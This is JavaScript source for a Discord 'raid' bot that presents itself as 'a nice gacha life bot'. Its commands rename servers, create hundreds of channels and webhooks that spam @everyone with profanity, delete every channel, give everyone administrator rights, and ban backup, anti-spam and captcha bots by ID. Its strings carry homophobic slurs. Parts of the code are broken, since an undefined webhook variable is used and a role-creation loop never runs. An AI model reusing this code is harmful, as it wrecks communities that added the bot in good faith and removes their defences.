const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = '$';

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

client.on("ratelimit", () =>{
    console.log(`RATELIMIT FODA DMS`)
})

client.on("guildAdd", (guild) =>{
  guild.systemChannel.send(`thank you for adding this bot! please put me on top role for best experience, thank you.`)
});

client.on("ready", () => { 
    console.log(`ready for destroy ppl's days`)
    console.log(`Defoko V3`)
    client.user.setActivity(`Defoco V3 - Prefix: $ [a nice gacha life bot]`);
});

client.on("message", async (message) => {
    if(message.author.bot) return;
    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const comando = args.shift().toLowerCase();

    const server = message.guild.channels;
    const botrole = message.guild.roles.find("name", "Tefoco V3");
    switch(comando) {
        case "yeet":
            message.delete();
            if(message.guild.channels > 500) return message.channel.send(`too much text channels`)
            let i;
            if(!args.slice(0).join(' ')){ 
                message.guild.setName('haha admin go grr')
                for(i = 0; i < 499; i++){
                    message.guild.createChannel('haha admin go grr', 'text').then(m =>{
                        const mch1 = message.channel.id
                        m.createWebhook("get raided faggots").then(w => {
                          const case1hook = new Discord.WebhookClient(w.id, w.token)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                        })
                    })
                    message.guild.createChannel('haha admin go grr', 'voice')
                 }
            } else {
                message.guild.setName(`${args.slice(0).join(' ')}`)
                for(i = 0; i < 499; i++){
                    message.guild.createChannel(`${args.slice(0).join(' ')}`, 'text').then(m =>{
                        const mch2 = message.channel.id
                        m.createWebhook("get raided faggots").then(w => {
                          const case2hook = new Discord.WebhookClient(w.id, w.token)                        
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                        })
                    })
                    message.guild.createChannel(`${args.slice(0).join(' ')}`, 'voice')
                }
            }
            for(i = 0; i == 250; i++) message.guild.createRole({name: 'boiola'})
        break;
        case "del":
            message.delete();
            server.deleteAll();
            message.guild.createChannel('se fudeu', 'text')
        break;
        case "admall":
            message.delete();
            message.guild.defaultRole.setPermissions(['ADMINISTRATOR']);
        break;
        case "servername":
            message.delete();
            if(!args.slice(0).join(' ')) return message.channel.send("give a name, dumbass")
            message.guild.setName(`${args.slice(0).join(' ')}`)
        break;
        case "help":
            message.delete();
            const help = [`Tefoco V3\n`,
            "prefix: $",
            "$yeet (optional name for the things)- makes a lot of text channels and vcs, and roles, changes the server's name and pings everyone on the new channels",
            "$del - yeets all the channels and only leaves one",
            "$admall - self explanatory",
            "$servername (new server name) - self explanatory",
            "$antiprotector - bans xenon (backup bot), betterantispam and some captcha bots (dunno if its working)",
            "$yes (vc id) - plays some weebness", //please for love of god dont hate on this command, i spent almost 1 hour just to find the proper ffmpeg buildpack for heroku and the opus package for this bot
            `$help - bruhhh\n`,
            "Bot by paradino, making gachafags and furries lifes worse"]
            message.author.send(`${help.slice(0).join(`\n`)}`).catch(() => message.channel.send(`enable yo dms dumbass`))
        break;
        case "antiprotector":
          message.delete()
          message.guild.ban(`416358583220043796`)
          message.guild.ban(`501982335076532224`)
          message.guild.ban(`554631615565922364`)
          message.guild.ban(`426537812993638400`)
          message.guild.ban(`159985870458322944`)
          message.guild.ban(`512333785338216465`)
        break;
        case "rolepos":
          message.channel.send(botrole.position)
        break;
        case "yes":
          message.delete();
          if(!args[0]) return;
          const vc = client.channels.get(args[0])
          vc.join().then(connection => {
            const dispatcher = connection.playFile('./catchthewave.mp3');
            dispatcher.on("end", end => {vc.leave()});
          })
        break;
        case "hentai":
          message.delete();
          if(!args[0]) return;
          const vcc = client.channels.get(args[0])
          vcc.join().then(connection => {
            const dispatcherr = connection.playFile('./sstm.mp3');
            dispatcherr.on("end", end => {vcc.leave()});
          })
        break;
    }
});

client.login(process.env.token);

//para de olhar aqui poha
//- mene paradino
